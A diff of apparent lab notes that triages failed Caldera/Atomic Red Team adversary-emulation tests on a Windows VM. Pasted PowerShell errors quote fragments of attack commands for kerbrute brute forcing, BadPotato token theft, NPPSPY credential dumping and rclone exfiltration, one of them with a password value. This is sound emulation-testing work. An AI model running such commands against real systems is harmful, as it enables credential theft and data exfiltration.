@@ -1,174 +1,298 @@
-# Based on "https://docs.google.com/spreadsheets/d/1us5s5YAVRlIK6DfHIImLJEAYF1IhjF3vjx3R__E4ZR8/edit#gid=1045731843"
+# BASED ON: "https://docs.google.com/spreadsheets/d/1us5s5YAVRlIK6DfHIImLJEAYF1IhjF3vjx3R__E4ZR8/edit#gid=1045731843"
+
+# LOOK INTO : https://github.com/mitre/caldera/issues/
+
+
+
+# – caldera’s handling of payloads do not seem to be great (directory resolve ; such as $PathToAtomicsFolder), but rather depends on users and user should modify command if needed. 
+
+# MAIN TODO:
+# (Fixing may involve adjusting/modifying the command of caldera-ability AND/OR preparing file on specified directory in VM):
+
+# Priority-1. TRY TO USE the existing payloads in mini-machine-1's "/home/etw0/Desktop/caldera/plugins/atomic/payloads" and "/home/etw0/Desktop/caldera/plugins/stockpile/payloads" for the ones that could not be properly used by failed TTPs due to path issues
+# -- stockpile_plugin_payloads_list.txt, atomic_plugin_payloads_list.txt   on Github
+
+# Priority-2. Focus on Easy Fixes 
+#     - install firefox or chrome making sure the installed directory path matches that is referred in the failed TTP)
+#     - Missing files/registry-keys that are easy to add
+
+# 3. For more difficult fixes , first Sort out the doable ones and not doable ones ; Could spend some time on the doable ones
+
+
+# NOTE : $env 와 current directory는 error-message로 유추할수있는듯
 
 {
-# TODO -- 세분화
-# relates to 'ExternalPayloads'
-"PathToAtomicsFolder related issues": [
-	"atomic_windows_depfalse_pshtrue__t1574_008__multiple__hijack_execution_flow-_path_interception_by_search_order_hijacking__e538e0ff74962aaf1dbd08baa5c7853f",
-	"atomic_windows_depfalse_pshtrue__t1569_002__execution__system_services-_service_execution__e4c51df716410dc7baccead922f9d9a4",
-	"atomic_windows_depfalse_pshtrue__t1567_002__exfiltration__exfiltration_over_web_service-_exfiltration_to_cloud_storage__9995c62a6263a14ae3b60fe2bb52e67a",
-	"atomic_windows_depfalse_pshtrue__t1564__defense-evasion__hide_artifacts__b7f89af9214876eae185527350ca034f",
-	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__0402c74f97e712d03605175c5ba9675b",
-	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__0402c74f97e712d03605175c5ba9675b",
-	"atomic_windows_depfalse_pshtrue__t1558_004__credential-access__steal_or_forge_kerberos_tickets-_as-rep_roasting__358926f4adef63bf95d152e35df4dab3",
-	"atomic_windows_depfalse_pshtrue__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__eedc7881da4d2fddb5c56fb96aaeecfd",
-	"atomic_windows_depfalse_pshtrue__t1556_002__multiple__modify_authentication_process-_password_filter_dll__cc7f0eb8b9115b271eaaa42c9b6f3dca",
-	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__1272c02ca685d9967ee2be885dea8df5",
-	"atomic_windows_depfalse_pshtrue__t1552_006__credential-access__unsecured_credentials-_group_policy_preferences__e93d024cd93ceaaf880d6f799ef1c9c8",
-	"atomic_windows_depfalse_pshtrue__t1550_003__multiple__use_alternate_authentication_material-_pass_the_ticket__566388d2f3073aced1a2c86b3a65826c",
-	"atomic_windows_depfalse_pshtrue__t1547_012__multiple__boot_or_logon_autostart_execution-_print_processors__b2725f4e411b9328aa73fe54501a7564",
-	"atomic_windows_depfalse_pshtrue__t1547_003__multiple__time_providers__23daed0787180c7f2ffbc20528570749",
-	"atomic_windows_depfalse_pshtrue__t1547_003__multiple__time_providers__7a4867f379d79c82f217108c48bdbf33",
-	"atomic_windows_depfalse_pshtrue__t1547_002__multiple__authentication_package__7197a8fcd7e833f42251ee3eddaa87c1",
-	"atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__fef50b36806647cb5a5511ae48f7e56f",
-	"atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__acf646b22c5d2c2b1058feb7da1f3bdc",
-	"atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__3b631d04243ac011df9f91cd07025180",
-	"atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__03a127453d425bf1fd8dc9af1ed7ddce",
-	"atomic_windows_depfalse_pshtrue__t1546_011__multiple__event_triggered_execution-_application_shimming__a967003ff25bdd94030cdd885feb25d7",
-	"atomic_windows_depfalse_pshtrue__t1539__credential-access__steal_web_session_cookie__126aaf80c6a232eaf08dcef3163d4aed",
-	"atomic_windows_depfalse_pshtrue__t1485__impact__data_destruction__b74b60096fb49650e27e470047a2b9c9",
-	"atomic_windows_depfalse_pshtrue__t1482__discovery__domain_trust_discovery__ff659febed01ef020792aa5f83d08d6d",
-	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__e0e717c540d5e8ff24f00b7434626f7e",
-	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__d21a964d09837abede8966daf6ae46cf",
-	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__396dae93ab07f7c93853def404fefebf",
-	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__9e1358e1b78af4bf86bab2334485a015",
-	"atomic_windows_depfalse_pshtrue__t1187__credential-access__forced_authentication__608b7021a5b8369e9fd858feba6f5611",
-	"atomic_windows_depfalse_pshtrue__t1135__discovery__network_share_discovery__7a87eec9166dd9d24825a4af7bb3bc47",
-	"atomic_windows_depfalse_pshtrue__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__a515bb54fd6e14b78297814875f3c73b",
-	"atomic_windows_depfalse_pshtrue__t1134_002__multiple__create_process_with_token__163fd8a878476002c604d0fe4e32a419",
-	"atomic_windows_depfalse_pshtrue__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__81289b3d78d06c14b816f7644b1d9f8b",
-	"atomic_windows_depfalse_pshtrue__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__2cda9de49fe7ac16813a23d0741e9b28",
-	"atomic_windows_depfalse_pshtrue__t1114_001__collection__email_collection-_local_email_collection__21363f92027047ce1dbfdd47f7a483b5",
-	"atomic_windows_depfalse_pshtrue__t1110_004__credential-access__brute_force-_credential_stuffing__3d7b7a1676afefc4af9506003b2d58d1",
-	"atomic_windows_depfalse_pshtrue__t1110_003__credential-access__brute_force-_password_spraying__e5168b0f7e57ba7b20c9842a350bb539",
-	"atomic_windows_depfalse_pshtrue__t1110_001__credential-access__brute_force-_password_guessing__77e4fd90d211edf046c6c7092a4ed3af",
-	"atomic_windows_depfalse_pshtrue__t1090_003__command-and-control__proxy-_multi-hop_proxy__f21623deb932dc0db3f00068ba15bf32",
-	"atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__9ccef9b46ce26850bb709a83d8e538ae",
-	"atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__3d628a543cd195d2a19b89b76a8e5d74",
-	"atomic_windows_depfalse_pshtrue__t1083__discovery__file_and_directory_discovery__abc280f400f218aa1f4d5efe3c9e8228",
-	"atomic_windows_depfalse_pshtrue__t1074_001__collection__data_staged-_local_data_staging__885997e230cb2b9dc3cc7e9d8ec5a6d8",
-	"atomic_windows_depfalse_pshtrue__t1071_004__command-and-control__application_layer_protocol-_dns__ce2eccff2f1de0096efa0da778a7e27c",
-	"atomic_windows_depfalse_pshtrue__t1071_004__command-and-control__application_layer_protocol-_dns__08faa1ff79f2c8e48a2869a830c210f7",
 
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
+# DONE -- 세분화 + 'STDERR or STDOUT' COPY-PASTE
+#
+# Related Caldera Github posts:
+# -- https://github.com/mitre/caldera/issues/2489
+# -- https://github.com/mitre/caldera/issues/2798
+# -- https://github.com/mitre/atomic?tab=readme-ov-file (IMPORTANT)
+# -----> When importing tests from Atomic Red Team, this plugin also catches $PathToAtomicsFolder usages pointing to an existing file. 
+#        It then imports the files as payloads and fix path usages. Note other usages are not handled. 
+#        If a path with $PathToAtomicsFolder points to an existing directory or an unexisting file, we will not process it any further and ingest it "as it is"
+#        https://github.com/mitre/atomic/blob/4f489bb69371f3300f71bfd659a8d2a0d011f88a/app/atomic_svc.py#L140
+# JY: Based on this, seems like I need to populate the payload directory of "https://github.com/mitre/atomic/tree/master/payloads"
+#     mini-machine-1 의 /home/etw0/Desktop/caldera/plugins/atomic.payloads에는 file 들있는데 $PathToAtomicsFolder 에 reference된건 없는듯? (다른 경우에 쓰인것들은 좀있는데)
+#     
+#     ** TODO : SO TRY TO USE  "https://github.com/mitre/atomic/tree/master/payloads" ? stockpile also has some files in payloads
+#     
+#
+# 	"ExternalPayload" seems like they want us to do it manually
+
+"PathToAtomicsFolder related issues": [
+
+
+	#----------------------------------------------------------------------------------------------------------------------------------------
 	# Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\<X>\' because it does not exist.
-	"atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__f1dcadde207fafe338ae3eb48805f23c",
-	"atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__68ce066d07960123ccd981dd8c38a7c1",
-	"atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__1f2da2639fcd636ef1c7ead72de4469f",
-	"atomic_windows_depfalse_pshtrue__t1003__credential-access__os_credential_dumping__24a6ff3816824ecae285f847995709cf",
+	"atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__f1dcadde207fafe338ae3eb48805f23c", # ['Get-ChildItem : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\T1551.006_timestomp.txt\' because it does not exist.At line:1 char:1+ Get-ChildItem "PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_time ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...6_timestomp.txt:String) [Get-ChildItem], ItemNotFound    Exception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand ']
+	"atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__68ce066d07960123ccd981dd8c38a7c1", # ['Get-ChildItem : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\T1551.006_timestomp.txt\' because it does not exist.At line:1 char:1+ Get-ChildItem "PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_time ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...6_timestomp.txt:String) [Get-ChildItem], ItemNotFound    Exception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand ']
+	"atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__1f2da2639fcd636ef1c7ead72de4469f", # ['Get-ChildItem : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\T1551.006_timestomp.txt\' because it does not exist.At line:1 char:1+ Get-ChildItem "PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_time ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...6_timestomp.txt:String) [Get-ChildItem], ItemNotFound    Exception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand ']
+	"atomic_windows_depfalse_pshtrue__t1003__credential-access__os_credential_dumping__24a6ff3816824ecae285f847995709cf", # ['Copy-Item : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\NPPSPY.dll\' because it does not exist.At line:1 char:1+ Copy-Item "PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll" -Desti ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...oads\\NPPSPY.dll:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']
+	"atomic_windows_depfalse_pshtrue__t1567_002__exfiltration__exfiltration_over_web_service-_exfiltration_to_cloud_storage__9995c62a6263a14ae3b60fe2bb52e67a", # ['cd : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\T1567.002\' because it does not exist.At line:1 char:93+ ... clone.conf; cd "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rcl ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...loads\\T1567.002:String) [Set-Location], ItemNotFoundE    xception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand .\\rclone.exe : The term \'.\\rclone.exe\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:160+ ... older\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\"; .\\rclone.exe config  ...+                                                      ~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\rclone.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException .\\rclone.exe : The term \'.\\rclone.exe\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:360+ ...  pass = vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"; .\\rclone.exe copy -- ...+                                                      ~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\rclone.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__1272c02ca685d9967ee2be885dea8df5", # ['Set-Location : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\Sysinternals\' because it does not exist.At line:1 char:1+ Set-Location -path "PathToAtomicsFolder\\..\\ExternalPayloads\\Sysintern ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ds\\Sysinternals:String) [Set-Location], ItemNotFoundE    xception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand ./accesschk.exe : The term \'./accesschk.exe\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:76+ ... micsFolder\\..\\ExternalPayloads\\Sysinternals"; ./accesschk.exe -accept ...+                                                   ~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (./accesschk.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1547_003__multiple__time_providers__23daed0787180c7f2ffbc20528570749", # ['Copy-Item : Cannot find path \'C:\\T1547.003\\bin\\AtomicTest.dll\' because it does not exist.At line:1 char:19+ ... op w32time; Copy-Item "$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.003\\bin\\AtomicTest.dll:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']
+	"atomic_windows_depfalse_pshtrue__t1547_003__multiple__time_providers__7a4867f379d79c82f217108c48bdbf33", # ['Copy-Item : Cannot find path \'C:\\T1547.003\\bin\\AtomicTest.dll\' because it does not exist.At line:1 char:19+ ... op w32time; Copy-Item "$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.003\\bin\\AtomicTest.dll:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']
+	"atomic_windows_depfalse_pshtrue__t1547_002__multiple__authentication_package__7197a8fcd7e833f42251ee3eddaa87c1", # ['Copy-Item : Cannot find path \'C:\\T1547.002\\bin\\package.dll\' because it does not exist.At line:1 char:1+ Copy-Item "$PathToAtomicsFolder\\T1547.002\\bin\\package.dll" C:\\Windows ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.002\\bin\\package.dll:String) [Copy-Item], ItemNotFoundException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']
+	"atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__fef50b36806647cb5a5511ae48f7e56f",
+	"atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__3b631d04243ac011df9f91cd07025180", # ['Copy-Item : Cannot find path \'C:\\T1547.001\\src\\vbsstartup.vbs\' because it does not exist.At line:1 char:1+ Copy-Item "$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs" "$env:A ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.001\\src\\vbsstartup.vbs:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand Copy-Item : Cannot find path \'C:\\T1547.001\\src\\vbsstartup.vbs\' because it does not exist.At line:1 char:140+ ... artup.vbs"; Copy-Item "$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.001\\src\\vbsstartup.vbs:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']
+	"atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__03a127453d425bf1fd8dc9af1ed7ddce", # ['Copy-Item : Cannot find path \'C:\\T1547.001\\src\\batstartup.bat\' because it does not exist.At line:1 char:1+ Copy-Item "$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat" "$env:A ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.001\\src\\batstartup.bat:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand Copy-Item : Cannot find path \'C:\\T1547.001\\src\\batstartup.bat\' because it does not exist.At line:1 char:140+ ... artup.bat"; Copy-Item "$PathToAtomicsFolder\\T1547.001\\src\\batstartup. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.001\\src\\batstartup.bat:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:281+ ... artup.bat"; Start-Process "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\ ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:372+ ... artup.bat"; Start-Process "C:\\ProgramData\\Microsoft\\Windows\\Start Men ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']
+	"atomic_windows_depfalse_pshtrue__t1546_011__multiple__event_triggered_execution-_application_shimming__a967003ff25bdd94030cdd885feb25d7", # ['Copy-Item : Cannot find path \'C:\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\' because it does not exist.At line:1 char:1+ Copy-Item "$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1546.011\\bi...patDatabase.sdb:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand Copy-Item : Cannot find path \'C:\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\' because it does not exist.At line:1 char:132+ ... tabase.sdb; Copy-Item "$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011Co ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1546.011\\bi...patDatabase.sdb:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']
+	"atomic_windows_depfalse_pshtrue__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__2cda9de49fe7ac16813a23d0741e9b28", # ['cd : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\' because it does not exist.At line:1 char:1+ cd "PathToAtomicsFolder\\..\\ExternalPayloads"; Start-Process .\\BadPota ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4\\Desktop\\ExternalPayloads:String) [Set-Location], ItemNo    tFoundException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:47+ ... \\ExternalPayloads"; Start-Process .\\BadPotato.exe notepad.exe; Start- ...+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']
+	"atomic_windows_depfalse_pshtrue__t1110_004__credential-access__brute_force-_credential_stuffing__3d7b7a1676afefc4af9506003b2d58d1", # ['cd : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\' because it does not exist.At line:1 char:1+ cd "PathToAtomicsFolder\\..\\ExternalPayloads"; .\\kerbrute.exe brutefor ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4\\Desktop\\ExternalPayloads:String) [Set-Location], ItemNo    tFoundException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand .\\kerbrute.exe : The term \'.\\kerbrute.exe\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:47+ cd "PathToAtomicsFolder\\..\\ExternalPayloads"; .\\kerbrute.exe brutefor ...+                                               ~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\kerbrute.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1110_003__credential-access__brute_force-_password_spraying__e5168b0f7e57ba7b20c9842a350bb539", # ['cd : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\' because it does not exist.At line:1 char:1+ cd "PathToAtomicsFolder\\..\\ExternalPayloads"; .\\kerbrute.exe password ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4\\Desktop\\ExternalPayloads:String) [Set-Location], ItemNo    tFoundException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand .\\kerbrute.exe : The term \'.\\kerbrute.exe\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:47+ cd "PathToAtomicsFolder\\..\\ExternalPayloads"; .\\kerbrute.exe password ...+                                               ~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\kerbrute.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1110_001__credential-access__brute_force-_password_guessing__77e4fd90d211edf046c6c7092a4ed3af", # ['cd : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\' because it does not exist.At line:1 char:1+ cd "PathToAtomicsFolder\\..\\ExternalPayloads"; .\\kerbrute.exe bruteuse ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4\\Desktop\\ExternalPayloads:String) [Set-Location], ItemNo    tFoundException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand .\\kerbrute.exe : The term \'.\\kerbrute.exe\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:47+ cd "PathToAtomicsFolder\\..\\ExternalPayloads"; .\\kerbrute.exe bruteuse ...+                                               ~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\kerbrute.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__3d628a543cd195d2a19b89b76a8e5d74", # ['cd : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\' because it does not exist.At line:1 char:1+ cd "PathToAtomicsFolder\\..\\ExternalPayloads"; .\\kerbrute.exe userenum ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4\\Desktop\\ExternalPayloads:String) [Set-Location], ItemNo    tFoundException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand .\\kerbrute.exe : The term \'.\\kerbrute.exe\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:47+ cd "PathToAtomicsFolder\\..\\ExternalPayloads"; .\\kerbrute.exe userenum ...+                                               ~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\kerbrute.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1071_004__command-and-control__application_layer_protocol-_dns__ce2eccff2f1de0096efa0da778a7e27c", # ['Set-Location : Cannot find path \'C:\\Users\\puma-4\\Desktop\\PathToAtomicsFolder\' because it does not exist.At line:1 char:1+ Set-Location "PathToAtomicsFolder"; .\\T1071.004\\src\\T1071-dns-domain- ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ToAtomicsFolder:String) [Set-Location], ItemNotFoundE    xception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand .\\T1071.004\\src\\T1071-dns-domain-length.ps1 : The term \'.\\T1071.004\\src\\T1071-dns-domain-length.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:37+ ... ToAtomicsFolder"; .\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain ...+                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\T1071.004\\src...main-length.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
